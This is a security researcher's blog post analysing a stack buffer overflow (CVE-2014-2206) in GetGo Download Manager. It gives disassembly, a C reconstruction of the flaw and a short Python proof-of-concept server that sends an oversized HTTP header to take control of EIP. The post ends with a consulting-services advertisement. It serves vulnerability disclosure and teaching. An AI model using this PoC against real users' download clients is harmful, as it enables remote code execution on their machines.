# CVE-2014-2206: GetGo Download Manager HTTP Response Header Buffer Overflow Remote Code Execution

by [Julien Ahrens](https://www.rcesecurity.com/author/mrtux/ "Posts by Julien Ahrens") | Sunday, March 2, 2014 | [Exploit](https://www.rcesecurity.com/category/exploit/) | [0 comments](https://www.rcesecurity.com/2014/03/cve-2014-2206-getgo-download-manager-http-response-header-buffer-overflow-remote-code-execution/#respond)

I’ve published another [security advisory](http://seclists.org/fulldisclosure/2014/Mar/18) about a remote code execution vulnerability with a CVSS score of 10,0 today. Affected are all available versions of the [GetGo Download Manager](http://www.getgosoft.com/), so if you’re still using this software you should immediately switch to a more secure one, because the GetGo project is dead, but still [high-rated by cnet.com](http://download.cnet.com/GetGo-Download-Manager/3000-2071_4-10277023.html).

This article is a quick’n’dirty root-cause analysis of the bug, tested using a fully patched, DEP-enabled Windows 7×64:

> When a website is requested for download, the application reads the HTTP Response Header values of the target page and copies the retrieved values to a temporary buffer, which is set to a fixed size of 4097 bytes, but this size is not used by the application to limit the input to the buffer. Instead it fills the buffer byte by byte until the terminating sequence “\r\n” is found. Therefore the application writes outside the expected memory boundaries if the HTTP Response Header is greater than 4097 bytes.

Let’s have a look at how the application handles HTTP downloads.

![](https://www.rcesecurity.com/wp-content/uploads/2022/10/getgo-rce-1-1024x517-1.png)

When you request to download a webpage like this, the debugger jumps in at the breakpoint at **0x004A4CF4**, which is the entry point to the vulnerable code part:

```
004A4CDE   . 8B4D 08        MOV ECX,DWORD PTR SS:[EBP+8]
004A4CE1   . 51             PUSH ECX                                 ; /Arg3
004A4CE2   . 68 01100000    PUSH 1001                                ; |Arg2 = 00001001
004A4CE7   . 8D95 DCEFFFFF  LEA EDX,DWORD PTR SS:[EBP-1024]          ; |
004A4CED   . 52             PUSH EDX                                 ; |Arg1
004A4CEE   . 8B8D 9CEFFFFF  MOV ECX,DWORD PTR SS:[EBP-1064]          ; |
004A4CF4   . E8 77EDFFFF    CALL GetGoDM.004A3A70                    ; \GetGoDM.004A3A70

```

The function call takes 3 arguments to further process them. A mapped c-style function call might look like this:

```
int vuln_func(void *buffer, size_t arg2, int arg3)

```

The stack contains the three arguments, whereat Arg1 points to a buffer at **0x0430C390**, Arg2 is 0x00001001 and Arg3 is 0x00000078:

[![getgo-rce-2](/wp-content/uploads/2022/10/getgo-rce-2.png)](/wp-content/uploads/2022/10/getgo-rce-2.png)

A small side-notice: You can completely ignore Arg3 in this vulnerability-case, because this value is only used as the timeout value for a ws2\_32 [select](http://msdn.microsoft.com/en-us/library/windows/desktop/ms740141%28v%3Dvs.85%29.aspx) call which is involved in reading the bytes from the socket:

[![getgo-rce-2b](/wp-content/uploads/2022/10/getgo-rce-2b.png)](/wp-content/uploads/2022/10/getgo-rce-2b.png)
### WTF happens here ?

The first important instruction set in vuln\_func() is located at:

```
004A3A9F  |. 8B45 0C        MOV EAX,DWORD PTR SS:[EBP+C]
004A3AA2  |. 50             PUSH EAX
004A3AA3  |. 6A 00          PUSH 0
004A3AA5  |. 8B4D 08        MOV ECX,DWORD PTR SS:[EBP+8]
004A3AA8  |. 51             PUSH ECX
004A3AA9  |. E8 F2650400    CALL GetGoDM.004EA0A0

```

The function call at **0x004A3AA9** takes the same 3 arguments like the calling function, which are pushed on the stack:

```
0430C2E4   0430C390  | arg1
0430C2E8   00000000  | arg2
0430C2EC   00001001  | arg3

```

It performs a simple [memset](http://www.cplusplus.com/reference/cstring/memset/) call – so the function call looks like this:

```
void memset(void *arg1, int arg2, size_t arg3)

```

Memset simply fills up memory space (arg1) with some unsigned char values (arg2) up to a specified number of bytes (arg3). This means that the buffer space at **0x430C390** is cleared out with 4097 bytes of 0x00s.

Next up: The vulnerable code part:

[![getgo-rce-3](/wp-content/uploads/2022/10/getgo-rce-3.png)](/wp-content/uploads/2022/10/getgo-rce-3.png)

I think this really needs some clarification and therefore I divide this loop into two pieces.

### Part #1 – Read one byte of the HTTP response header

```
004A3AE3  |. 8B45 10        |MOV EAX,DWORD PTR SS:[EBP+10]
004A3AE6  |. 50             |PUSH EAX                                ; /Arg3
004A3AE7  |. 6A 01          |PUSH 1                                  ; |Arg2 = 00000001
004A3AE9  |. 8B4D F0        |MOV ECX,DWORD PTR SS:[EBP-10]           ; |
004A3AEC  |. 8B55 08        |MOV EDX,DWORD PTR SS:[EBP+8]            ; |
004A3AEF  |. 8D440A FF      |LEA EAX,DWORD PTR DS:[EDX+ECX-1]        ; |
004A3AF3  |. 50             |PUSH EAX                                ; |Arg1
004A3AF4  |. 8B4D D8        |MOV ECX,DWORD PTR SS:[EBP-28]           ; |
004A3AF7  |. 83C1 0C        |ADD ECX,0C                              ; |
004A3AFA  |. E8 81A4FFFF    |CALL GetGoDM.0049DF80                   ; \GetGoDM.0049DF80

```

The call at **0x004A3AFA** takes three arguments:

```
int read_byte(void *buffer, char *arg2, int arg3)

```

whereas the first argument arg1 points to the buffer, arg2 is always 0x00000001 and arg3 is always 0x00000078. This function simply reads 1 byte from the received HTTP response header, puts the value into the buffer and returns 1 if the byte was successfully read.

A CMP instruction at the end indicates whether the byte was successfully read, otherwise the function will jump out of the loop at **0x004A3B0F**.

```
004A3AFF  |. 8945 E8        |MOV DWORD PTR SS:[EBP-18],EAX
004A3B02  |. 837D E8 00     |CMP DWORD PTR SS:[EBP-18],0
004A3B06  |. 75 09          |JNZ SHORT GetGoDM.004A3B11
004A3B08  |. C745 EC 000000>|MOV DWORD PTR SS:[EBP-14],0
004A3B0F  |. EB 49          |JMP SHORT GetGoDM.004A3B5A

```
### Part #2 – Compare the received string to “\r\n”

![](https://www.rcesecurity.com/wp-content/uploads/2022/10/getgo-rce-4-1024x719-1.png)
```
004A3B26  |. 6A 00          |PUSH 0                                  ; /Arg2 = 00000000
004A3B28  |. 68 F8D76600    |PUSH GetGoDM.0066D7F8                   ; |Arg1 = 0066D7F8 ASCII "
"
004A3B2D  |. 8D4D E4        |LEA ECX,DWORD PTR SS:[EBP-1C]           ; |
004A3B30  |. E8 2B5AF6FF    |CALL GetGoDM.00409560                   ; \GetGoDM.00409560

```

The function call at **0x004A3B30** takes at the first look only two parameters – Arg1 contains a string-sequence which translates to “\r\n” and Arg2 is always 0x00000000.

Additionally the function itself reads the already received bytes from the stack to compare both values:

```
0040959E  |. 0345 0C        ADD EAX,DWORD PTR SS:[EBP+C]             ; |
004095A1  |. 50             PUSH EAX                                 ; |Arg1
004095A2  |. E8 79120A00    CALL GetGoDM.004AA820                    ; \GetGoDM.004AA820

```
[![getgo-rce-4b](/wp-content/uploads/2022/10/getgo-rce-4b.png)](/wp-content/uploads/2022/10/getgo-rce-4b.png)

So the function call looks like this:

```
signed int search_teminator(*buffer, "\r\n", 0)

```

This function returns -1 if the string “\r\n” was not found, this leads to the following CMP:

```
004A3B38  |. 837D E0 FF     |CMP DWORD PTR SS:[EBP-20],-1
004A3B3C  |. 74 11          |JE SHORT GetGoDM.004A3B4F

```

The return value of the function search\_teminator() is CMP’ed to -1, which means the JMP is taken and the application continues to execute the following instructions including a JMP back to the beginning of the code-part:

```
004A3B4F  |> 8B55 F0        |MOV EDX,DWORD PTR SS:[EBP-10]
004A3B52  |. 83C2 01        |ADD EDX,1
004A3B55  |. 8955 F0        |MOV DWORD PTR SS:[EBP-10],EDX
004A3B58  |.^EB 80          \JMP SHORT GetGoDM.004A3ADA

```

But if the string “\r\n” is found the function search\_terminator() returns the position of the string, which leads to the CMP statement returning false” and the following statements are executed including a jump out of the loop:

```
004A3B3E  |. 8B45 08        |MOV EAX,DWORD PTR SS:[EBP+8]
004A3B41  |. 0345 E0        |ADD EAX,DWORD PTR SS:[EBP-20]
004A3B44  |. C600 00        |MOV BYTE PTR DS:[EAX],0
004A3B47  |. 8B4D E0        |MOV ECX,DWORD PTR SS:[EBP-20]
004A3B4A  |. 894D EC        |MOV DWORD PTR SS:[EBP-14],ECX
004A3B4D  |. EB 0B          |JMP SHORT GetGoDM.004A3B5A

```
### Reverse Engineering

The vulnerable code-part can be roughly translated to a C code snippet like:

```
int vuln_func(void *buffer, size_t arg2, int arg3)
{
  int a;
  signed int b;

  memset(void *buffer, 0, arg2);

  while (1)
  {
    a = read_byte(*buffer, 1 , arg3)
    if ( !a )
    {
      goto fail;
    }

    b = search_terminator(*buffer, "\r\n", 0)
    if ( b != -1 )
      break;
  }

fail:
  return 0;
}

```

Do you see the problem here ? The size argument (arg2) is used to prepare memory space using memset, but the loop reads all bytes from the header response until there’s a “\r\n” completely ignoring arg2. Now…if an attacker is able to supply more than 4097 bytes as the HTTP response header, the loop writes outside the expected memory boundaries, which leads to a stack-based buffer overflow condition, resulting in Remote Code Execution.

### One PoC to pwn it

The following PoC creates an arbitrary webserver, that responds with an over-sized HTTP header:

```
from socket import *
from time import sleep

host = "192.168.0.1"
port = 80

s = socket(AF_INET, SOCK_STREAM)
s.bind((host, port))
s.listen(1)
print "\n[+] Listening on %d ..." % port

cl, addr = s.accept()
print "[+] Connection accepted from %s" % addr[0]

payload = "\xCC" * 9000

buffer = "HTTP/1.1 200 "+payload+"\r\n"

print cl.recv(1000)
cl.send(buffer)
print "[+] Sending buffer: OK\n"

sleep(1)
cl.close()
s.close()

```

…and this results in EIP control. Pretty cool :-)!

A few days ago, Wordfence published a blog post about a PHP Object Injection vulnerability affecting the popular WordPress Plugin GiveWP in all versions <= 3.14.1. Since the blog post contains only information about (a part) of the POP chain used, I decided to take a look and build a fully functional Remote Code Execution exploit. This post describes how I approached the process, identifying the missing parts and building the entire POP chain.

# Services

We’re currently offering the following consulting services:

## Penetration Tests

A penetration test, or pen test, is a security assessment that involves simulating attacks on a computer system, network, or application. We attempt to identify vulnerabilities and weaknesses in the target system by using the same techniques and tools as potential malicious actors. The objective is to uncover and address security risks before they can be exploited, helping organizations enhance their cybersecurity defenses and protect against real threats. Penetration tests are a proactive measure to ensure the robustness of digital assets and data security.

We perform penetration tests against all kinds of targets:

* Web applications with any tech stack
* Web service APIs – i.e., GraphQl, Rest, SOAP
* Android mobile apps
* iOS mobile apps

## Bug Bounty Services

Empower your organization’s cybersecurity with a tailored Bug Bounty Program. Take control of your digital defense by engaging a community of ethical hackers to proactively identify vulnerabilities. Running your own Bug Bounty Program enhances your security posture and demonstrates a commitment to staying ahead in the ever-evolving landscape of cyber threats.

Do you want to run your own vulnerability disclosure or bug bounty program? Or do you already operate one but are not happy with how it is managed? Do you want to have independent triage?

What we do:

* Setting up vulnerability disclosure and bug bounty programs
* Managing new and existing programs
* Triaging incoming bug bounty reports

## Source Code Reviews

A security source code review, also known as a code audit or static code analysis, is a meticulous examination of the software’s source code to identify and rectify security vulnerabilities and flaws. This in-depth analysis is crucial for ensuring that software applications are robust and resistant to potential cyber threats, as it enables developers and security experts to spot and mitigate security issues before they can be exploited by malicious actors.

We perform source code reviews of applications based on the following languages:

* Java
* PHP
* .NET

## Attack Surface Management

Attack Surface Management is a security practice focused on identifying, monitoring, and reducing digital vulnerabilities and potential points of attack within an organization’s IT environment. It involves a comprehensive assessment of the organization’s assets, including applications, networks, and data, to determine where and how malicious actors might exploit weaknesses. By actively managing and minimizing the attack surface, organizations can strengthen their security posture, reduce risks, and safeguard their systems and data from potential cyber threats.

What we do:

* Continuous monitoring of any of your assets, including mobile apps.
